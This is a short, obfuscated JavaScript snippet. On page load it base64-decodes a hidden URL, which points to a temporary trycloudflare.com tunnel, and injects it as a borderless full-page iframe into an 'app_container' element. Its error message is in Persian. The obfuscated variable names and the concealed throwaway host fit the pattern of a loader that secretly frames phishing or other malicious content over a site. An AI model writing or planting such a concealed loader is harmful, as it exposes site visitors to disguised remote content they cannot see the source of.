window.addEventListener('DOMContentLoaded', (event) => {
    (function() {
        var _0x5a21 = "aHR0cHM6Ly9maW5pc2hpbmctY2FtY29yZGVycy1jcmFpZy1vbnMudHJ5Y2xvdWRmbGFyZS5jb20="; 
        var _0x8b12 = atob(_0x5a21);
        
        var _0x3c9f = document.createElement("iframe");
        _0x3c9f.setAttribute("src", _0x8b12);
        _0x3c9f.setAttribute("id", "_view_frame");
        _0x3c9f.style.width = "100%";
        _0x3c9f.style.height = "100%";
        _0x3c9f.style.border = "none";
        
        var container = document.getElementById("app_container");
        if (container) {
            container.appendChild(_0x3c9f);
        } else {
            console.error("خطا: المانی با آی‌دی app_container پیدا نشد!");
        }
    })();
});

